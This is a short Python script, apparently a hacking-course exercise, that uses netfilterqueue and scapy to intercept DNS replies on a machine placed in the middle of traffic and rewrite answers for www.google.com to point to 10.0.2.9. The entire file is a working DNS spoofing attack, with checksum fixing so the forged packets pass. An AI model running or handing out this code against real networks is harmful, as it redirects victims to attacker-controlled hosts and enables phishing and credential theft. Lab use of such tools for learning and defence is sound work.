import netfilterqueue as net
import scapy.all as scapy


def dns_spoofer(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.DNSRR):
        requested_domain = scapy_packet[scapy.DNSQR].qname
        if "www.google.com" in requested_domain:
            print("[+] Spoofing the Target")
            modified_dns_response = scapy.DNSRR(rrname = requested_domain, rdata = "10.0.2.9")
            scapy_packet[scapy.DNS].an = modified_dns_response
            scapy_packet[scapy.DNS].ancount = 1

            del scapy_packet[scapy.IP].len
            del scapy_packet[scapy.IP].chksum
            del scapy_packet[scapy.UDP].len
            del scapy_packet[scapy.UDP].chksum
            packet.set_payload(str(scapy_packet))
    packet.accept()


queue = net.NetfilterQueue()
queue.bind(0, dns_spoofer)
try:
    queue.run()
except:
    print('Closing')